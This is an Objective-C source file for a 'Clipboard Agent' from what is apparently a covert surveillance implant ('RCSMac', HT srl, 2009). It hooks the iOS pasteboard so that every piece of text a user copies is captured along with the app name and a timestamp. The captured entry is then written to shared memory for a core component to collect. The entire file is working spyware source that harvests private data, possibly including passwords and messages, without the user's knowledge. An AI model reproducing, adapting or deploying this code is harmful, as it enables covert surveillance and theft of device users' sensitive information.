/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIAgentPasteboard.h"
#import "RCSISharedMemory.h"
#import "RCSICommon.h"

#define LOG_DELIMITER 0xABADC0DE

//#define DEBUG

extern RCSISharedMemory *mSharedMemoryLogging;

@implementation myUIPasteboard

- (void)addItemsHook: (NSArray *)items
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  int i;
  short unicodeNullTerminator = 0x0000;
  NSString      *_windowName;
  NSString      *_processName;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSData        *data = nil;

  _processName = [[NSBundle mainBundle] bundleIdentifier];
  _windowName  = [[[NSBundle mainBundle] bundleIdentifier] lastPathComponent];

#ifdef DEBUG
  NSLog(@"%s: logging clipboard items [%@]", __FUNCTION__, items);
#endif

  [self addItemsHook: items];

  if (items)
    {
      // loop on dictionaries array
      for (i=0; i<[items count]; i++) 
        {
          NSDictionary *tmpItem = (NSDictionary*)[items objectAtIndex:i];

          if (tmpItem) 
            {
              NSData *_data = nil;

              // get only text
              _data = [tmpItem objectForKey: @"public.utf8-plain-text"];

              if (_data)
                {
#ifdef DEBUG
                  NSLog(@"%s: logging clipboard item [%@]", __FUNCTION__, [_data class]);
#endif
                  if ([_data isKindOfClass: [NSString class]]) 
                    {
#ifdef DEBUG
                      NSLog(@"%s: clipboard item is NSString", __FUNCTION__);
#endif
                      data = [(NSString*)_data dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
                    }
                  else if ([_data isKindOfClass: [NSData class]] ||
                           [_data isKindOfClass: [NSMutableData class]])
                    {
#ifdef DEBUG
                      NSLog(@"%s: clipboard item is NSData", __FUNCTION__);
#endif
                      data = _data;
                    }
                  else
                    continue;

                  break;
                }
            }
        }

      if (data == nil)
        {
#ifdef DEBUG
          NSLog(@"%s: no clipboard logging!", __FUNCTION__);
#endif
          [pool release];

          return;
        }

      NSString *dataString = [[NSString alloc] initWithData: data
                                                   encoding: NSUTF8StringEncoding];

      NSMutableData *clipboardContent = [[NSMutableData alloc] initWithData:
                                              [dataString dataUsingEncoding:NSUTF16LittleEndianStringEncoding
                                                       allowLossyConversion:true]];

      NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      NSMutableData *entryData = [[NSMutableData alloc] init];


      time_t rawtime;
      struct tm *tmTemp;

      processName  = [[NSMutableData alloc] initWithData:
                         [_processName dataUsingEncoding:
                         NSUTF16LittleEndianStringEncoding]];

      // Struct tm
      time (&rawtime);
      tmTemp = gmtime(&rawtime);
      tmTemp->tm_year += 1900;
      tmTemp->tm_mon  ++;

      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];

      // Process Name
      [entryData appendData: processName];
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];

#ifdef DEBUG
      NSLog(@"%s: process name [%@]", __FUNCTION__, processName);
#endif    

      if (_windowName == nil || [_windowName length] == 0) 
        _windowName = @"unknown";

      windowName = [[NSMutableData alloc] initWithData:
                        [_windowName dataUsingEncoding:
                        NSUTF16LittleEndianStringEncoding]];

      [entryData appendData: windowName];
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];

#ifdef DEBUG
      NSLog(@"%s: window name [%@]", __FUNCTION__, windowName);
#endif

      // Clipboard
      [entryData appendData: clipboardContent];

      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];

      // Delimiter
      uint32_t del = LOG_DELIMITER;
      [entryData appendBytes: &del
                      length: sizeof(del)];

      [windowName release];

      [clipboardContent release];

      shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = LOG_CLIPBOARD;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];

      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);

      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"setDataHook: clipboard logged: %@", dataString);
#endif
        }
#ifdef DEBUG
      else
        NSLog(@"setDataHook: Error while logging clipboard to shared memory");
#endif

      [entryData release];
      [dataString release];
      [logData release];
    }

  [pool release];

  return;
}

@end
